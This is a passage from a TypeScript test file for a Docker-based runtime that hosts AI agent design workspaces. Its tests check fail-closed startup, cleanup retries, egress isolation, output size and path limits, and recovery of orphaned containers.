        stderrPreview: expect.stringContaining('cds runtime diagnostic truncated'),
        stdoutPreview: '',
      },
    });
    expect(Buffer.byteLength(String((error as AgentWorkspaceRuntimeError).details?.stderrPreview), 'utf8'))
      .toBeLessThanOrEqual(2 * 1024);
    expect(fs.readdirSync(rootDir)).toEqual([]);
  });

  it('fails closed and cleans the session when official web prototype resources cannot be prepared', async () => {
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'brief.txt', content: 'brief', mediaType: 'text/plain' },
    ]);
    const shell = new RecordingShell();
    shell.failTemplateInit = true;
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      instanceId: 'instance-a',
      capabilityCacheMs: 0,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
      fetchImpl: async () => new Response(workspacePackage.serialized, { status: 200 }),
    });

    const error = await runtime.create('session-template-init-failure', {
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'transfer-token',
      inputSha256: workspacePackage.sha256,
      baseRevision: 'rev-1',
      maxInputBytes: 1024,
      maxOutputBytes: 1024,
      allowedOutputPaths: ['index.html', 'manifest.json'],
    }, {
      cpuCores: 1,
      memoryMb: 768,
      timeoutSeconds: 30,
      networkPolicy: 'egress-only',
      autoCleanupMinutes: 5,
    }).catch((caught: unknown) => caught);

    expect(error).toMatchObject({
      code: 'workspace_design_template_init_failed',
      retryable: false,
      details: {
        stage: 'design_template_init',
        exitCode: 1,
        stderrPreview: 'web prototype resources missing',
        stdoutPreview: '',
      },
    });
    expect(shell.calls.some((call) => call.command.startsWith('docker rm -f '))).toBe(true);
    expect(shell.calls.filter((call) => (
      call.command.startsWith('docker volume rm ') && !call.command.includes('storage-probe')
    ))).toHaveLength(2);
    expect(fs.readdirSync(rootDir)).toEqual([]);
  });

  it('retains a real partial cleanup handle and retries only residual creation resources', async () => {
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'brief.txt', content: 'brief', mediaType: 'text/plain' },
    ]);
    const shell = new RecordingShell();
    shell.failTemplateInit = true;
    shell.volumeCleanupFailures = 1;
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      instanceId: 'instance-a',
      capabilityCacheMs: 0,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
      fetchImpl: async () => new Response(workspacePackage.serialized, { status: 200 }),
    });

    const error = await runtime.create('session-partial-cleanup', {
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'transfer-token',
      inputSha256: workspacePackage.sha256,
      baseRevision: 'rev-1',
      maxInputBytes: 1024,
      maxOutputBytes: 1024,
      allowedOutputPaths: ['index.html', 'manifest.json'],
    }, {
      cpuCores: 1,
      memoryMb: 768,
      timeoutSeconds: 30,
      networkPolicy: 'egress-only',
      autoCleanupMinutes: 5,
    }).catch((caught: unknown) => caught);

    expect(error).toMatchObject({
      code: 'workspace_cleanup_failed',
      retryable: true,
      details: {
        originalCode: 'workspace_design_template_init_failed',
        cleanupErrors: ['OpenDesign session volume could not be removed'],
      },
    });
    expect(runtime.has('session-partial-cleanup')).toBe(true);
    await expect(runtime.execute(
      'session-partial-cleanup',
      'must not execute',
      {
        baseUrl: 'https://map.example.test/api/design-artifacts/runtime/run-1/llm/v1',
        protocol: 'openai',
        apiKey: 'model-secret',
        model: 'map-managed',
      },
      'transfer-token',
    )).rejects.toMatchObject({ code: 'workspace_cleanup_pending' });

    const removalCallsBeforeRetry = shell.calls.filter((call) => (
      call.command.startsWith('docker volume rm ') && !call.command.includes('storage-probe')
    ));
    expect(removalCallsBeforeRetry).toHaveLength(2);
    const failedVolumeRemoval = removalCallsBeforeRetry[0].command;

    await runtime.stop('session-partial-cleanup', 'retry_partial_cleanup');

    expect(runtime.has('session-partial-cleanup')).toBe(false);
    const removalCallsAfterRetry = shell.calls.filter((call) => (
      call.command.startsWith('docker volume rm ') && !call.command.includes('storage-probe')
    ));
    expect(removalCallsAfterRetry).toHaveLength(3);
    expect(removalCallsAfterRetry.filter((call) => call.command === failedVolumeRemoval)).toHaveLength(2);
    const callCountAfterCleanup = shell.calls.length;
    await runtime.stop('session-partial-cleanup', 'idempotent_retry');
    expect(shell.calls).toHaveLength(callCountAfterCleanup);
    expect(fs.readdirSync(rootDir)).toEqual([]);
  });

  it('autonomously retries transient active cleanup failures and reports final release', async () => {
    vi.useFakeTimers();
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'brief.txt', content: 'brief', mediaType: 'text/plain' },
    ]);
    const shell = new RecordingShell();
    shell.returnNoSuchForRepeatedCleanup = true;
    const cleanupSettled = vi.fn();
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      capabilityCacheMs: 0,
      cleanupRetryBaseMs: 5,
      cleanupRetryMaxMs: 20,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
      fetchImpl: async () => new Response(workspacePackage.serialized, { status: 200 }),
    });
    await runtime.create('session-cleanup-janitor', {
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'transfer-token',
      inputSha256: workspacePackage.sha256,
      baseRevision: 'rev-1',
      maxInputBytes: 1024,
      maxOutputBytes: 1024,
      allowedOutputPaths: ['index.html', 'manifest.json'],
    }, {
      cpuCores: 1,
      memoryMb: 768,
      timeoutSeconds: 30,
      networkPolicy: 'egress-only',
      autoCleanupMinutes: 5,
    }, undefined, cleanupSettled);
    shell.volumeCleanupFailures = 5;

    await expect(runtime.stop('session-cleanup-janitor', 'manual_cleanup'))
      .rejects.toMatchObject({ code: 'workspace_cleanup_failed' });
    expect(runtime.has('session-cleanup-janitor')).toBe(true);
    expect(cleanupSettled).not.toHaveBeenCalled();

    await vi.advanceTimersByTimeAsync(5);

    expect(runtime.has('session-cleanup-janitor')).toBe(true);
    expect(cleanupSettled).not.toHaveBeenCalled();
    await vi.advanceTimersByTimeAsync(10);

    expect(runtime.has('session-cleanup-janitor')).toBe(true);
    expect(cleanupSettled).not.toHaveBeenCalled();
    await vi.advanceTimersByTimeAsync(20);

    expect(runtime.has('session-cleanup-janitor')).toBe(false);
    expect(cleanupSettled).toHaveBeenCalledTimes(1);
    expect(cleanupSettled).toHaveBeenCalledWith();
  });

  it('autonomously retries partial creation cleanup and reports final release', async () => {
    vi.useFakeTimers();
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'brief.txt', content: 'brief', mediaType: 'text/plain' },
    ]);
    const shell = new RecordingShell();
    shell.failTemplateInit = true;
    shell.volumeCleanupFailures = 1;
    shell.returnNoSuchForRepeatedCleanup = true;
    const cleanupSettled = vi.fn();
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      capabilityCacheMs: 0,
      cleanupRetryBaseMs: 5,
      cleanupRetryMaxMs: 20,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
      fetchImpl: async () => new Response(workspacePackage.serialized, { status: 200 }),
    });

    const error = await runtime.create('session-partial-cleanup-janitor', {
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'transfer-token',
      inputSha256: workspacePackage.sha256,
      baseRevision: 'rev-1',
      maxInputBytes: 1024,
      maxOutputBytes: 1024,
      allowedOutputPaths: ['index.html', 'manifest.json'],
    }, {
      cpuCores: 1,
      memoryMb: 768,
      timeoutSeconds: 30,
      networkPolicy: 'egress-only',
      autoCleanupMinutes: 5,
    }, undefined, cleanupSettled).catch((caught: unknown) => caught);

    expect(error).toMatchObject({ code: 'workspace_cleanup_failed' });
    expect(runtime.has('session-partial-cleanup-janitor')).toBe(true);
    expect(cleanupSettled).not.toHaveBeenCalled();

    await vi.advanceTimersByTimeAsync(5);

    expect(runtime.has('session-partial-cleanup-janitor')).toBe(false);
    expect(cleanupSettled).toHaveBeenCalledTimes(1);
    expect(cleanupSettled).toHaveBeenCalledWith();
  });

  it('fails closed before an Agent run when the MAP-only egress relay cannot be isolated', async () => {
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'brief.txt', content: 'brief', mediaType: 'text/plain' },
    ]);
    const requestedPaths: string[] = [];
    const shell = new RecordingShell();
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      capabilityCacheMs: 0,
      pollIntervalMs: 5,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
      fetchImpl: async (input, init) => {
        const url = new URL(typeof input === 'string' ? input : input instanceof URL ? input : input.url);
        requestedPaths.push(url.pathname);
        if (url.pathname === '/input') return new Response(workspacePackage.serialized, { status: 200 });
        if (url.pathname === '/api/health') return Response.json({ ok: true });
        if (url.pathname === '/api/import/folder' && init?.method === 'POST') {
          return Response.json({
            project: { id: 'od-project', skillId: 'web-prototype' },
            conversationId: 'od-conversation',
          });
        }
        return new Response('', { status: 404 });
      },
    });
    await runtime.create('session-egress-fail', {
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'transfer-token',
      inputSha256: workspacePackage.sha256,
      baseRevision: 'rev-1',
      maxInputBytes: 1024,
      maxOutputBytes: 1024,
      allowedOutputPaths: ['index.html', 'manifest.json'],
    }, {
      cpuCores: 1,
      memoryMb: 768,
      timeoutSeconds: 30,
      networkPolicy: 'egress-only',
      autoCleanupMinutes: 5,
    });
    shell.failEgressConnect = true;

    await expect(runtime.execute('session-egress-fail', 'Build the page.', {
      baseUrl: 'https://map.example.test/api/design-artifacts/runtime/run-1/llm/v1',
      protocol: 'openai',
      apiKey: 'model-secret',
      model: 'map-managed',
    }, 'transfer-token')).rejects.toMatchObject({ code: 'workspace_egress_unavailable' });
    expect(requestedPaths).not.toContain('/api/runs');

    await runtime.stop('session-egress-fail');
  });

  it('pre-registers an egress container and retains a partial cleanup handle when docker run fails', async () => {
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'brief.txt', content: 'brief', mediaType: 'text/plain' },
    ]);
    const shell = new RecordingShell();
    shell.failEgressRun = true;
    shell.egressCleanupFailures = 2;
    shell.returnNoSuchForRepeatedCleanup = true;
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      capabilityCacheMs: 0,
      pollIntervalMs: 5,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
      fetchImpl: async (input, init) => {
        const url = new URL(typeof input === 'string' ? input : input instanceof URL ? input : input.url);
        if (url.pathname === '/input') return new Response(workspacePackage.serialized, { status: 200 });
        if (url.pathname === '/api/health') return Response.json({ ok: true });
        if (url.pathname === '/api/import/folder' && init?.method === 'POST') {
          return Response.json({
            project: { id: 'od-project', skillId: 'web-prototype' },
            conversationId: 'od-conversation',
          });
        }
        return new Response('', { status: 404 });
      },
    });
    await runtime.create('session-egress-cleanup-retry', {
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'transfer-token',
      inputSha256: workspacePackage.sha256,
      baseRevision: 'rev-1',
      maxInputBytes: 1024,
      maxOutputBytes: 1024,
      allowedOutputPaths: ['index.html', 'manifest.json'],
    }, {
      cpuCores: 1,
      memoryMb: 768,
      timeoutSeconds: 30,
      networkPolicy: 'egress-only',
      autoCleanupMinutes: 5,
    });

    await expect(runtime.execute('session-egress-cleanup-retry', 'Build the page.', {
      baseUrl: 'https://map.example.test/api/design-artifacts/runtime/run-1/llm/v1',
      protocol: 'openai',
      apiKey: 'model-secret',
      model: 'map-managed',
    }, 'transfer-token')).rejects.toMatchObject({ code: 'workspace_cleanup_failed' });
    const egressRunIndex = shell.calls.findIndex((call) => call.command.startsWith('docker run --detach'));
    const firstEgressRemovalIndex = shell.calls.findIndex((call) => (
      call.command.startsWith('docker rm -f ') && call.command.includes('cds-od-egress-')
    ));
    expect(egressRunIndex).toBeGreaterThan(-1);
    expect(firstEgressRemovalIndex).toBeGreaterThan(egressRunIndex);
    expect(shell.calls.some((call) => call.command.startsWith('docker network connect '))).toBe(false);
    const egressRemovalsBeforeStop = shell.calls.filter((call) => (
      call.command.startsWith('docker rm -f ') && call.command.includes('cds-od-egress-')
    ));
    expect(egressRemovalsBeforeStop).toHaveLength(1);
    expect(runtime.has('session-egress-cleanup-retry')).toBe(true);

    await expect(runtime.stop('session-egress-cleanup-retry', 'retry_egress_cleanup'))
      .rejects.toMatchObject({ code: 'workspace_cleanup_failed' });
    expect(runtime.has('session-egress-cleanup-retry')).toBe(true);
    await runtime.stop('session-egress-cleanup-retry', 'retry_egress_cleanup_again');

    const egressRemovalsAfterStop = shell.calls.filter((call) => (
      call.command.startsWith('docker rm -f ') && call.command.includes('cds-od-egress-')
    ));
    expect(egressRemovalsAfterStop).toHaveLength(3);
    expect(runtime.has('session-egress-cleanup-retry')).toBe(false);
  });

  it.each([
    ['total_bytes', 'design_output_too_large'],
    ['file_count', 'design_output_too_many_files'],
    ['workspace_file_count', 'design_output_too_many_files'],
    ['node_count', 'design_output_too_many_files'],
    ['directory_depth', 'design_output_invalid'],
    ['special_file', 'design_output_invalid'],
    ['path_not_allowed', 'design_output_invalid'],
  ] as const)('rejects container output preflight failure %s before docker cp', async (failure, expectedCode) => {
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const workspacePackage = buildPackage([
      { path: 'index.html', content: '<!doctype html><html><body>Draft</body></html>', mediaType: 'text/html' },
    ]);
    const shell = new RecordingShell();
    shell.outputPreflightFailure = failure;
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      capabilityCacheMs: 0,
      pollIntervalMs: 5,
      containerUid: process.getuid?.() ?? 1001,
      containerGid: process.getgid?.() ?? 1001,
      fetchImpl: async (input, init) => {
        const url = new URL(typeof input === 'string' ? input : input instanceof URL ? input : input.url);
        if (url.pathname === '/input') return new Response(workspacePackage.serialized, { status: 200 });
        if (url.pathname === '/api/health') return Response.json({ ok: true });
        if (url.pathname === '/api/import/folder' && init?.method === 'POST') {
          return Response.json({
            project: { id: 'od-project', skillId: 'web-prototype' },
            conversationId: 'od-conversation',
          });
        }
        if (url.pathname === '/api/runs' && init?.method === 'POST') {
          return Response.json({ runId: 'od-run-output-preflight' }, { status: 202 });
        }
        if (url.pathname === '/api/runs/od-run-output-preflight') {
          return Response.json({ status: 'succeeded', deliverableValid: true });
        }
        return new Response('', { status: 404 });
      },
    });
    await runtime.create(`session-output-${failure}`, {
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'transfer-token',
      inputSha256: workspacePackage.sha256,
      baseRevision: 'rev-1',
      maxInputBytes: 1024,
      maxOutputBytes: 1024,
      allowedOutputPaths: ['index.html', 'manifest.json'],
    }, {
      cpuCores: 1,
      memoryMb: 768,
      timeoutSeconds: 30,
      networkPolicy: 'egress-only',
      autoCleanupMinutes: 5,
    });

    const rejected = runtime.execute(`session-output-${failure}`, 'Build the page.', {
      baseUrl: 'https://map.example.test/api/design-artifacts/runtime/run-1/llm/v1',
      protocol: 'openai',
      apiKey: 'model-secret',
      model: 'map-managed',
    }, 'transfer-token');
    await expect(rejected).rejects.toMatchObject({ code: expectedCode });
    if (failure === 'path_not_allowed') {
      await expect(rejected).rejects.toMatchObject({
        details: { stage: 'output_preflight', rejectedPath: 'unexpected/runtime-state.json' },
      });
    }

    expect(shell.calls.some((call) => call.command.includes('CDS_OUTPUT_PREFLIGHT=1'))).toBe(true);
    expect(shell.calls.some((call) => (
      call.command.startsWith('docker cp ') && call.command.includes(':/workspace/.')
    ))).toBe(false);
    await runtime.stop(`session-output-${failure}`);
  });

  it('rejects transfer credentials hidden in URL query parameters', () => {
    expect(() => normalizeWorkspaceTransfer({
      schemaVersion: MAP_DESIGN_WORKSPACE_SCHEMA,
      inputPackageUrl: 'https://map.example.test/input?ticket=secret',
      resultCommitUrl: 'https://map.example.test/commit',
      transferToken: 'bearer-secret',
      inputSha256: 'a'.repeat(64),
      baseRevision: 'rev-1',
      maxInputBytes: 1024,
      maxOutputBytes: 1024,
      allowedOutputPaths: ['index.html', 'manifest.json'],
    })).toThrowError(/cannot contain credentials, query parameters, or fragments/);
  });

  it('keeps OpenDesign unavailable when hard workspace storage limits cannot be verified', async () => {
    const shell = new RecordingShell();
    shell.failStorageCapability = true;
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      capabilityCacheMs: 0,
      autoPullImage: false,
    });

    await expect(runtime.capability(true)).resolves.toEqual({
      available: false,
      resourcePolicyEnforcedPerSession: false,
      reason: 'Docker node cannot enforce and verify hard per-session Agent workspace storage limits (validation_exit_1_docker_or_shell_error; storage limit was not enforced)',
    });

    const probeCreate = shell.calls.find((call) => (
      call.command.startsWith('docker volume create') && call.command.includes('storage-probe')
    ));
    expect(probeCreate?.command).toContain('--driver local');
    expect(probeCreate?.command).toContain('--opt type=tmpfs');
    expect(probeCreate?.command).toContain('nr_inodes=64');
    const probeRun = shell.calls.find((call) => (
      call.command.startsWith('docker run --rm') && call.command.includes('/cds-storage-probe')
    ));
    expect(probeRun?.command).toContain('/cds-direct-storage-probe');
    expect(probeRun?.command).toContain('nr_inodes=64');
    expect(probeRun?.command).toContain('--user 0:0');
    expect(probeRun?.command).toContain('( : > "$root/inode-limit-$created" )');
    expect(probeRun?.command).toContain('test "$created" -lt 128');
    expect(shell.calls.some((call) => (
      call.command.startsWith('docker volume rm ') && call.command.includes('storage-probe')
    ))).toBe(true);
  });

  it('returns a fail-closed cold snapshot without waiting for a slow Docker probe', async () => {
    const dockerVersion = deferred<ExecResult>();
    let dockerProbeStarted = false;
    const shell: IShellExecutor = {
      async exec(command: string): Promise<ExecResult> {
        const storageResult = storageCapabilityResult(command);
        if (storageResult) return storageResult;
        if (command.startsWith('docker version')) {
          dockerProbeStarted = true;
          return dockerVersion.promise;
        }
        if (command.startsWith('docker image inspect')) return result('sha256:image-a\n');
        if (command.includes('--entrypoint /bin/sh')) return result('/usr/local/bin/opencode\n');
        throw new Error(`unexpected command: ${command}`);
      },
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, { autoPullImage: false });

    await expect(runtime.capability()).resolves.toEqual({
      available: false,
      resourcePolicyEnforcedPerSession: false,
      reason: 'OpenDesign capability verification is running on this CDS node',
      verificationPending: true,
    });
    expect(dockerProbeStarted).toBe(true);

    dockerVersion.resolve(result('27.0.0\n'));
    await expect(runtime.capability(true)).resolves.toEqual({
      available: true,
      resourcePolicyEnforcedPerSession: true,
      reason: null,
    });
  });

  it('deduplicates concurrent forced capability refreshes', async () => {
    const dockerVersion = deferred<ExecResult>();
    let dockerProbeCount = 0;
    const shell: IShellExecutor = {
      async exec(command: string): Promise<ExecResult> {
        const storageResult = storageCapabilityResult(command);
        if (storageResult) return storageResult;
        if (command.startsWith('docker version')) {
          dockerProbeCount += 1;
          return dockerVersion.promise;
        }
        if (command.startsWith('docker image inspect')) return result('sha256:image-a\n');
        if (command.includes('--entrypoint /bin/sh')) return result('/usr/local/bin/opencode\n');
        throw new Error(`unexpected command: ${command}`);
      },
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, { autoPullImage: false });

    const probes = [runtime.capability(true), runtime.capability(true), runtime.capability(true)];
    expect(dockerProbeCount).toBe(1);
    dockerVersion.resolve(result('27.0.0\n'));

    await expect(Promise.all(probes)).resolves.toEqual([
      { available: true, resourcePolicyEnforcedPerSession: true, reason: null },
      { available: true, resourcePolicyEnforcedPerSession: true, reason: null },
      { available: true, resourcePolicyEnforcedPerSession: true, reason: null },
    ]);
    expect(dockerProbeCount).toBe(1);
  });

  it('serves a last-known-good catalog snapshot only within the bounded stale window', async () => {
    vi.useFakeTimers();
    let probeFails = false;
    const shell: IShellExecutor = {
      async exec(command: string): Promise<ExecResult> {
        const storageResult = storageCapabilityResult(command);
        if (storageResult) return storageResult;
        if (command.startsWith('docker version')) {
          if (probeFails) throw new Error('daemon request timed out');
          return result('27.0.0\n');
        }
        if (command.startsWith('docker image inspect')) return result('sha256:image-a\n');
        if (command.includes('--entrypoint /bin/sh')) return result('/usr/local/bin/opencode\n');
        throw new Error(`unexpected command: ${command}`);
      },
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      autoPullImage: false,
      capabilityCacheMs: 100,
      capabilityNegativeCacheMs: 20,
      capabilityMaxStaleMs: 300,
    });

    await expect(runtime.capability(true)).resolves.toMatchObject({ available: true });
    probeFails = true;
    vi.advanceTimersByTime(101);

    await expect(runtime.capability()).resolves.toMatchObject({ available: true });
    await Promise.resolve();
    await Promise.resolve();
    await expect(runtime.create('session-stale-capability', {}, {
      cpuCores: 1,
      memoryMb: 768,
      timeoutSeconds: 30,
      networkPolicy: 'egress-only',
      autoCleanupMinutes: 5,
    })).rejects.toMatchObject({ code: 'workspace_runtime_unavailable' });
    vi.advanceTimersByTime(200);

    await expect(runtime.capability()).resolves.toEqual({
      available: false,
      resourcePolicyEnforcedPerSession: false,
      reason: 'Docker capability probe failed; dedicated Agent workspace containers remain disabled',
    });
  });

  it('reuses CLI validation for the same image id and revalidates a changed image id', async () => {
    const imageIds = ['sha256:image-a', 'sha256:image-a', 'sha256:image-b', 'sha256:image-b'];
    let cliProbeCount = 0;
    const shell: IShellExecutor = {
      async exec(command: string): Promise<ExecResult> {
        const storageResult = storageCapabilityResult(command);
        if (storageResult) return storageResult;
        if (command.startsWith('docker version')) return result('27.0.0\n');
        if (command.startsWith('docker image inspect')) return result(`${imageIds.shift()}\n`);
        if (command.includes('--entrypoint /bin/sh')) {
          cliProbeCount += 1;
          return cliProbeCount === 1
            ? result('/usr/local/bin/opencode\n')
            : result('', 'opencode not found', 1);
        }
        throw new Error(`unexpected command: ${command}`);
      },
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, { autoPullImage: false });

    await expect(runtime.capability(true)).resolves.toMatchObject({ available: true });
    await expect(runtime.capability(true)).resolves.toMatchObject({ available: true });
    expect(cliProbeCount).toBe(1);
    await expect(runtime.capability(true)).resolves.toMatchObject({ available: false });
    await expect(runtime.capability(true)).resolves.toMatchObject({ available: false });
    expect(cliProbeCount).toBe(2);
  });

  it('warms the capability snapshot during bootstrap', async () => {
    const shell = new RecordingShell();
    const runtime = new AgentWorkspaceSessionRuntime(shell, { autoPullImage: false });

    await runtime.bootstrap();
    const callsAfterBootstrap = shell.calls.length;

    await expect(runtime.capability()).resolves.toEqual({
      available: true,
      resourcePolicyEnforcedPerSession: true,
      reason: null,
    });
    expect(shell.calls).toHaveLength(callsAfterBootstrap);
    expect(shell.calls.filter((call) => (
      call.command.includes('--entrypoint /bin/sh') && !call.command.includes('/cds-storage-probe')
    ))).toHaveLength(1);
  });

  it('keeps OpenDesign unavailable when the configured image is not installed', async () => {
    const shell: IShellExecutor = {
      async exec(command: string): Promise<ExecResult> {
        if (command.startsWith('docker version')) return result('27.0.0\n');
        if (command.startsWith('docker image inspect')) return result('', 'No such image', 1);
        throw new Error(`unexpected command: ${command}`);
      },
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, { capabilityCacheMs: 0, autoPullImage: false });

    await expect(runtime.capability(true)).resolves.toEqual({
      available: false,
      resourcePolicyEnforcedPerSession: false,
      reason: 'OpenDesign image ghcr.io/inernoro/prd_agent/opendesign-runtime@sha256:c4d2d53a21fa31adfb8b4b0dc189d6e8db3b7543f93c231c3574a75baf33f474 is not installed on this CDS node',
    });
  });

  it('prepares the pinned runtime image in the background before capability becomes selectable', async () => {
    let installed = false;
    const calls: string[] = [];
    const shell: IShellExecutor = {
      async exec(command: string): Promise<ExecResult> {
        calls.push(command);
        const storageResult = storageCapabilityResult(command);
        if (storageResult) return storageResult;
        if (command.startsWith('docker version')) return result('27.0.0\n');
        if (command.startsWith('docker image inspect')) {
          return installed ? result('sha256:image\n') : result('', 'No such image', 1);
        }
        if (command.startsWith('docker pull ')) {
          installed = true;
          return result('pulled\n');
        }
        if (command.includes('--entrypoint /bin/sh')) return result('/usr/local/bin/opencode\n');
        throw new Error(`unexpected command: ${command}`);
      },
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, { capabilityCacheMs: 0 });

    await runtime.prepareImage();

    expect(calls.some((command) => command.startsWith('docker pull '))).toBe(true);
    await expect(runtime.capability(true)).resolves.toEqual({
      available: true,
      resourcePolicyEnforcedPerSession: true,
      reason: null,
    });
  });

  it('reports a safe actionable category when registry authentication blocks image preparation', async () => {
    const shell: IShellExecutor = {
      async exec(command: string): Promise<ExecResult> {
        if (command.startsWith('docker version')) return result('27.0.0\n');
        if (command.startsWith('docker image inspect')) return result('', 'No such image', 1);
        if (command.startsWith('docker pull ')) {
          return result('', 'denied: requested access to the resource is denied', 1);
        }
        throw new Error(`unexpected command: ${command}`);
      },
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, { capabilityCacheMs: 0 });

    await runtime.prepareImage();

    await expect(runtime.capability(true)).resolves.toEqual({
      available: false,
      resourcePolicyEnforcedPerSession: false,
      reason: 'OpenDesign image ghcr.io/inernoro/prd_agent/opendesign-runtime@sha256:c4d2d53a21fa31adfb8b4b0dc189d6e8db3b7543f93c231c3574a75baf33f474 could not be prepared on this CDS node: runtime image registry authentication failed',
    });
    await expect(runtime.prepareImage()).resolves.toBeUndefined();
  });

  it('keeps OpenDesign unavailable when the image lacks its Agent CLI or web prototype resources', async () => {
    const shell: IShellExecutor = {
      async exec(command: string): Promise<ExecResult> {
        if (command.startsWith('docker version')) return result('27.0.0\n');
        if (command.startsWith('docker image inspect')) return result('sha256:image\n');
        if (command.includes('--entrypoint /bin/sh')) return result('', 'opencode not found', 1);
        throw new Error(`unexpected command: ${command}`);
      },
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, { capabilityCacheMs: 0 });

    await expect(runtime.capability(true)).resolves.toEqual({
      available: false,
      resourcePolicyEnforcedPerSession: false,
      reason: 'OpenDesign image ghcr.io/inernoro/prd_agent/opendesign-runtime@sha256:c4d2d53a21fa31adfb8b4b0dc189d6e8db3b7543f93c231c3574a75baf33f474 does not contain the required OpenCode Agent CLI and web prototype resources',
    });
  });

  it('reclaims labeled containers, networks, volumes, and stale workspace directories after restart', async () => {
    rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cds-agent-workspace-test-'));
    const instanceScope = digest('instance-a').slice(0, 8);
    const staleRoot = path.join(rootDir, instanceScope, 'session-stale-deadbeef');
    const legacyRoot = path.join(rootDir, 'legacy-session-other-owner');
    fs.mkdirSync(path.dirname(staleRoot), { recursive: true });
    fs.mkdirSync(staleRoot);
    fs.mkdirSync(legacyRoot);
    fs.writeFileSync(path.join(staleRoot, 'leftover.txt'), 'stale');
    const calls: string[] = [];
    const shell: IShellExecutor = {
      async exec(command: string): Promise<ExecResult> {
        calls.push(command);
        if (command.startsWith('docker ps -aq')) return result('deadbeef\n');
        if (command.startsWith('docker network ls -q')) return result('network-old\n');
        if (command.startsWith('docker volume ls -q')) return result('volume-old\n');
        if (command.startsWith('docker rm -f ')) return result('removed\n');
        if (command.startsWith('docker network rm ')) return result('removed\n');
        if (command.startsWith('docker volume rm ')) return result('removed\n');
        throw new Error(`unexpected command: ${command}`);
      },
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, {
      rootDir,
      instanceId: 'instance-a',
      autoPullImage: false,
    });

    await runtime.recoverOrphans();

    expect(fs.existsSync(staleRoot)).toBe(false);
    expect(fs.existsSync(legacyRoot)).toBe(true);
    expect(calls).toEqual(expect.arrayContaining([
      "docker ps -aq --filter 'label=cds.type=agent-session' --filter 'label=cds.instance=instance-a'",
      "docker network ls -q --filter 'label=cds.type=agent-session' --filter 'label=cds.instance=instance-a'",
      "docker volume ls -q --filter 'label=cds.type=agent-session' --filter 'label=cds.instance=instance-a'",
      "docker rm -f 'deadbeef'",
      "docker network rm 'network-old'",
      "docker volume rm 'volume-old'",
    ]));
    expect(calls.some((call) => call === "docker ps -aq --filter 'label=cds.type=agent-session'")).toBe(false);
  });

  it('keeps the provider unavailable when startup orphan cleanup cannot be proven complete', async () => {
    const shell: IShellExecutor = {
      async exec(command: string): Promise<ExecResult> {
        if (command.startsWith('docker ps -aq')) return result('', 'daemon unavailable', 1);
        if (command.startsWith('docker network ls -q')) return result('');
        if (command.startsWith('docker volume ls -q')) return result('');
        if (command.startsWith('docker version')) return result('27.0.0\n');
        if (command.startsWith('docker image inspect')) return result('sha256:image\n');
        if (command.includes('--entrypoint /bin/sh')) return result('/usr/local/bin/opencode\n');
        throw new Error(`unexpected command: ${command}`);
      },
    };
    const runtime = new AgentWorkspaceSessionRuntime(shell, { capabilityCacheMs: 0, autoPullImage: false });

    await runtime.bootstrap();

    await expect(runtime.capability()).resolves.toMatchObject({
      available: false,
